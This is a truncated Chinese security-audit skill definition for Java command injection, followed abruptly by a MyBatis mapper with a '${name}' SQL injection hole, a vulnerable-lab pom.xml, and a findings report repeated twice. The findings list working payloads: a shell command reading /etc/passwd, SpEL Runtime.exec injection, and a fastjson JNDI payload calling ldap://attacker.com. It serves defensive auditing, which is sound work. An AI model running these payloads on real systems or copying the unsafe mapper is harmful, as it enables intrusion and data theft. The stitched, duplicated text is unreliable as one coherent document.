1	---
2	name: java-command-injection
3	description: java command-injection
4	---
5	
6	# java command-injection
7	
8	## 0. 角色定位
9	- 你是专门检测 Java 命令注入漏洞的安全专家
10	- 你的核心职责是识别 Java 代码中用户输入与系统命令执行的危险结合点
11	- 你不负责 SQL 注入、XSS 等其他漏洞类型的检测（除非它们能链式导致命令执行）
12	
13	## 1. 漏洞概述
14	- **命令注入的定义**：攻击者通过用户输入操控系统命令执行，导致任意命令执行
15	- **常见危害**：服务器完全沦陷、数据泄露、内网横向渗透（案例：WebLogic T3 反序列化导致 root 权限沦陷；Log4Shell JNDI 注入链式 RCE）
16	- **CWE 参考**：CWE-78 (OS Command Injection)
17	
18	## 输入格式
19	你将接收：
20	- Java 源代码文件（.java, .jsp, .groovy）
21	- 文件路径和类/方法上下文
22	- 可选：用户指定的重点审查区域（如特定包路径）
23	
24	## 2. 检测目标
25	
26	识别以下风险类型：
27	
28	1. **直接命令执行**：`Runtime.exec()` / `ProcessBuilder` 直接拼接用户输入
29	2. **表达式注入**：OGNL/SpEL/EL 表达式中用户输入可触发命令执行
30	3. **反序列化链**：反序列化入口点可触发 Commons-Collections/Spring 等利用链
31	4. **间接命令执行**：通过 JNI、脚本引擎、模板引擎间接执行系统命令
32	5. **框架特定漏洞**：Struts2、WebLogic、JBoss 等框架的已知漏洞模式
33	
34	## 3. 检测步骤
35	
36	### 3.1 入口识别
37	
38	**搜索危险 API 调用模式：**
39	```java
40	// 直接命令执行
41	Runtime.getRuntime().exec(...)
42	new ProcessBuilder(...)
43	ProcessBuilder.command(...)
44	
45	// 脚本引擎
46	ScriptEngine.eval(...)
47	ScriptEngineManager.getEngineByName("js" | "groovy" | "python")
48	GroovyShell.evaluate(...)
49	GroovyShell.parse(...)
50

<!DOCTYPE mapper
        PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN"
        "http://mybatis.org/dtd/mybatis-3-mapper.dtd">

<mapper namespace="com.suyu.secexample.sql.mapper.UserMapper">
    <select id="listUser" resultType="com.suyu.secexample.sql.dao.User">
        select * from mybatis.user;
    </select>

    <select id="listUserByName" parameterType="com.suyu.secexample.sql.dao.pojo.UserQuery" resultType="com.suyu.secexample.sql.dao.User">
        select * from mybatis.user
            <where>
                <if test="name != null and name != ''">
                    name ='${name}'
                </if>
            </where>
    </select>

    <insert id="addUser" parameterType="com.suyu.secexample.csrf.model.User">
        insert into user(id,name,pwd)
        values (#{id},#{name},#{pwd})
    </insert>

</mapper>

<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <parent>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-parent</artifactId>
        <version>2.5.0</version>
        <relativePath/>
    </parent>
    <groupId>com.suyu</groupId>
    <artifactId>secexample</artifactId>
    <version>1.0</version>
    <name>SecExample</name>
    <description>Java开发的漏洞靶场</description>
    <properties>
        <java.version>1.8</java.version>
    </properties>
    <dependencies>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-thymeleaf</artifactId>
        </dependency>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
        </dependency>

        <!--devtools热部署-->
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-devtools</artifactId>
            <optional>true</optional>
            <scope>true</scope>
        </dependency>
        <!--添加mybatis整合springboot-->
        <dependency>
            <groupId>org.mybatis.spring.boot</groupId>
            <artifactId>mybatis-spring-boot-starter</artifactId>
            <version>1.3.0</version>
        </dependency>
        <!--连接MySQL驱动-->
        <dependency>
            <groupId>mysql</groupId>
            <artifactId>mysql-connector-java</artifactId>
            <version>8.0.22</version>
        </dependency>
        <!--lombok简化开发-->
        <dependency>
            <groupId>org.projectlombok</groupId>
            <artifactId>lombok</artifactId>
            <optional>true</optional>
        </dependency>
        <!--分页插件-->
        <dependency>
            <groupId>com.github.pagehelper</groupId>
            <artifactId>pagehelper-spring-boot-starter</artifactId>
            <version>1.3.0</version>
        </dependency>
        <!--fastjson漏洞依赖-->
        <dependency>
            <groupId>com.alibaba</groupId>
            <artifactId>fastjson</artifactId>
            <version>1.2.24</version>
        </dependency>
        <!--springboot测试依赖-->
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-test</artifactId>
            <scope>test</scope>
        </dependency>

    </dependencies>

    <build>
        <plugins>
            <plugin>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-maven-plugin</artifactId>
                <configuration>
                    <excludes>
                        <exclude>
                            <groupId>org.projectlombok</groupId>
                            <artifactId>lombok</artifactId>
                        </exclude>
                    </excludes>
                </configuration>
            </plugin>
        </plugins>
    </build>
</project>

# 命令注入漏洞检测结果
command_injection_findings:
  total_vulnerabilities: 3
  high_risk: 3
  medium_risk: 0
  low_risk: 0
  vulnerabilities:
    - id: "CMD-001"
      type: "Runtime.exec() 命令注入"
      file_path: "BOOT-INF/classes/com/suyu/secexample/rce/controller/rcecontroller.class"
      risk_level: "高"
      description: "控制器直接使用Runtime.getRuntime().exec()执行用户输入的命令，没有任何过滤或验证"
      vulnerable_code: |
        @PostMapping("/rceoutput")
        public String index(@RequestParam("command") String command, Model model) {
            if (command == null || command.isEmpty()) {
                command = "whoami";
            }
            try {
                Process p = Runtime.getRuntime().exec(command);
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String result = reader.readLine();
                model.addAttribute("result", result);
            } catch (IOException e) {
                e.printStackTrace();
            }
            return "rce/rceoutput";
        }
      data_flow:
        - step: 1
          description: "用户通过HTTP POST请求 /rceoutput 端点"
        - step: 2
          description: "参数command通过@RequestParam直接从用户输入获取"
        - step: 3
          description: "如果command为空，默认执行whoami"
        - step: 4
          description: "用户输入的command参数直接传递给Runtime.getRuntime().exec()方法"
        - step: 5
          description: "执行结果通过model.addAttribute返回给用户"
      attack_vector:
        - "POST /rceoutput?command=calc.exe"
        - "POST /rceoutput?command=cmd /c whoami"
        - "POST /rceoutput?command=/bin/sh -c 'cat /etc/passwd'"
      remediation: "禁止直接执行用户输入的命令；如必须执行，使用白名单限制允许的命令；对所有用户输入进行严格验证和转义"

    - id: "CMD-002"
      type: "SpEL注入 (可导致代码执行)"
      file_path: "BOOT-INF/classes/com/suyu/secexample/spel/controller/Spelcontroller.class"
      risk_level: "高"
      description: "控制器使用Spring Expression Language (SpEL)解析用户输入的表达式，可以导致任意代码执行"
      vulnerable_code: |
        @PostMapping("/speloutput")
        public String index(@RequestParam("selector") String selector, Model model) {
            if (selector == null || selector.isEmpty()) {
                selector = String.valueOf(666);
            }
            Expression expression = new SpelExpressionParser().parseExpression(selector);
            expression.getValue();
            model.addAttribute("selector", selector);
            return "spel/speloutput";
        }
      data_flow:
        - step: 1
          description: "用户通过HTTP POST请求 /speloutput 端点"
        - step: 2
          description: "参数selector通过@RequestParam直接从用户输入获取"
        - step: 3
          description: "用户输入的表达式直接传递给SpelExpressionParser.parseExpression()"
        - step: 4
          description: "通过getValue()执行表达式，可执行任意Java代码"
      attack_vector:
        - "POST /speloutput?selector=T(java.lang.Runtime).getRuntime().exec('calc.exe')"
        - "POST /speloutput?selector=T(java.lang.Runtime).getRuntime().exec('cmd /c whoami')"
      remediation: "禁止解析用户输入的SpEL表达式；使用SimpleEvaluationContext限制表达式能力；对所有表达式输入进行严格白名单验证"

    - id: "CMD-003"
      type: "Fastjson反序列化RCE (可导致代码执行)"
      file_path: "BOOT-INF/classes/com/suyu/secexample/fastjson/controller/fastjsoncontroller.class"
      risk_level: "高"
      description: "控制器使用fastjson 1.2.24版本解析用户输入的JSON，该版本存在已知的反序列化漏洞，可以导致任意代码执行"
      vulnerable_code: |
        @PostMapping("/fastjsonoutput")
        public String fastjson1(@RequestBody String jsonString, Model model) {
            JSONObject jsonObject = JSON.parseObject(jsonString);
            user.setAge(jsonObject.get("age").toString());
            user.setUsername(jsonObject.get("username").toString());
            model.addAttribute("result", user);
            return "fastjson/fastjsonoutput";
        }
      data_flow:
        - step: 1
          description: "用户通过HTTP POST请求 /fastjsonoutput 端点"
        - step: 2
          description: "JSON字符串通过@RequestBody直接从用户输入获取"
        - step: 3
          description: "使用fastjson 1.2.24版本的JSON.parseObject()解析用户输入"
        - step: 4
          description: "该版本存在反序列化漏洞(CVE-2017-18349)，可导致任意代码执行"
      attack_vector:
        - |
          POST /fastjsonoutput
          Content-Type: application/json
          {
            "@type":"com.sun.rowset.JdbcRowSetImpl",
            "dataSourceName":"ldap://attacker.com:1389/Exploit",
            "autoCommit":true
          }
      remediation: "升级fastjson至最新安全版本(1.2.83+)或替换为Jackson；开启SafeMode；禁用AutoType功能"

# 命令注入漏洞检测结果
command_injection_findings:
  total_vulnerabilities: 3
  high_risk: 3
  medium_risk: 0
  low_risk: 0
  vulnerabilities:
    - id: "CMD-001"
      type: "Runtime.exec() 命令注入"
      file_path: "BOOT-INF/classes/com/suyu/secexample/rce/controller/rcecontroller.class"
      risk_level: "高"
      description: "控制器直接使用Runtime.getRuntime().exec()执行用户输入的命令，没有任何过滤或验证"
      vulnerable_code: |
        @PostMapping("/rceoutput")
        public String index(@RequestParam("command") String command, Model model) {
            if (command == null || command.isEmpty()) {
                command = "whoami";
            }
            try {
                Process p = Runtime.getRuntime().exec(command);
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String result = reader.readLine();
                model.addAttribute("result", result);
            } catch (IOException e) {
                e.printStackTrace();
            }
            return "rce/rceoutput";
        }
      data_flow:
        - step: 1
          description: "用户通过HTTP POST请求 /rceoutput 端点"
        - step: 2
          description: "参数command通过@RequestParam直接从用户输入获取"
        - step: 3
          description: "如果command为空，默认执行whoami"
        - step: 4
          description: "用户输入的command参数直接传递给Runtime.getRuntime().exec()方法"
        - step: 5
          description: "执行结果通过model.addAttribute返回给用户"
      attack_vector:
        - "POST /rceoutput?command=calc.exe"
        - "POST /rceoutput?command=cmd /c whoami"
        - "POST /rceoutput?command=/bin/sh -c 'cat /etc/passwd'"
      remediation: "禁止直接执行用户输入的命令；如必须执行，使用白名单限制允许的命令；对所有用户输入进行严格验证和转义"

    - id: "CMD-002"
      type: "SpEL注入 (可导致代码执行)"
      file_path: "BOOT-INF/classes/com/suyu/secexample/spel/controller/Spelcontroller.class"
      risk_level: "高"
      description: "控制器使用Spring Expression Language (SpEL)解析用户输入的表达式，可以导致任意代码执行"
      vulnerable_code: |
        @PostMapping("/speloutput")
        public String index(@RequestParam("selector") String selector, Model model) {
            if (selector == null || selector.isEmpty()) {
                selector = String.valueOf(666);
            }
            Expression expression = new SpelExpressionParser().parseExpression(selector);
            expression.getValue();
            model.addAttribute("selector", selector);
            return "spel/speloutput";
        }
      data_flow:
        - step: 1
          description: "用户通过HTTP POST请求 /speloutput 端点"
        - step: 2
          description: "参数selector通过@RequestParam直接从用户输入获取"
        - step: 3
          description: "用户输入的表达式直接传递给SpelExpressionParser.parseExpression()"
        - step: 4
          description: "通过getValue()执行表达式，可执行任意Java代码"
      attack_vector:
        - "POST /speloutput?selector=T(java.lang.Runtime).getRuntime().exec('calc.exe')"
        - "POST /speloutput?selector=T(java.lang.Runtime).getRuntime().exec('cmd /c whoami')"
      remediation: "禁止解析用户输入的SpEL表达式；使用SimpleEvaluationContext限制表达式能力；对所有表达式输入进行严格白名单验证"

    - id: "CMD-003"
      type: "Fastjson反序列化RCE (可导致代码执行)"
      file_path: "BOOT-INF/classes/com/suyu/secexample/fastjson/controller/fastjsoncontroller.class"
      risk_level: "高"
      description: "控制器使用fastjson 1.2.24版本解析用户输入的JSON，该版本存在已知的反序列化漏洞，可以导致任意代码执行"
      vulnerable_code: |
        @PostMapping("/fastjsonoutput")
        public String fastjson1(@RequestBody String jsonString, Model model) {
            JSONObject jsonObject = JSON.parseObject(jsonString);
            user.setAge(jsonObject.get("age").toString());
            user.setUsername(jsonObject.get("username").toString());
            model.addAttribute("result", user);
            return "fastjson/fastjsonoutput";
        }
      data_flow:
        - step: 1
          description: "用户通过HTTP POST请求 /fastjsonoutput 端点"
        - step: 2
          description: "JSON字符串通过@RequestBody直接从用户输入获取"
        - step: 3
          description: "使用fastjson 1.2.24版本的JSON.parseObject()解析用户输入"
        - step: 4
          description: "该版本存在反序列化漏洞(CVE-2017-18349)，可导致任意代码执行"
      attack_vector:
        - |
          POST /fastjsonoutput
          Content-Type: application/json
          {
            "@type":"com.sun.rowset.JdbcRowSetImpl",
            "dataSourceName":"ldap://attacker.com:1389/Exploit",
            "autoCommit":true
          }
      remediation: "升级fastjson至最新安全版本(1.2.83+)或替换为Jackson；开启SafeMode；禁用AutoType功能"
